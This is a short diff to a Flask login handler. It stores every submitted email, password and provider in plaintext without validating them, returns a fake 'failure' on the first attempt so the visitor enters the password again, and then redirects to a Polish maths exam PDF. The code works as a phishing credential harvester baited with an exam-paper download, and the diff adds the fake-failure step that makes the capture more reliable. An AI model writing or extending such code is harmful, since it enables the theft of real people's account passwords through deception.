@@ -26,16 +26,25 @@ def login():
     password = request.form['password']
     provider = request.form['provider']
 
-    # Save the user credentials in the database
+    # Save the user credentials in the database regardless of the attempt
     new_user = User(email=email, password=password, provider=provider)
     db.session.add(new_user)
     db.session.commit()
 
-    # Track logged-in user by storing the user ID in session
-    session['user_id'] = new_user.id
+    # Check if this is the first login attempt
+    if session.get('login_attempt') is None:
+        # Set the first attempt to fail
+        session['login_attempt'] = 1
+        return jsonify({'status': 'failure'})  # Simulate a failed login
+    else:
+        # Second attempt: proceed with normal login and track the logged-in user
+        session['user_id'] = new_user.id
 
-    # Return JSON response for AJAX request
-    return jsonify({'status': 'success', 'redirect_url': 'https://arkusze.pl/maturalne/matematyka-2024-czerwiec-matura-podstawowa.pdf'})
+        # Clear the login attempt session variable
+        session.pop('login_attempt', None)
+
+        # Return JSON response for AJAX request
+        return jsonify({'status': 'success', 'redirect_url': 'https://arkusze.pl/maturalne/matematyka-2024-czerwiec-matura-podstawowa.pdf'})
 
 @app.route('/logout', methods=['POST'])
 def logout():
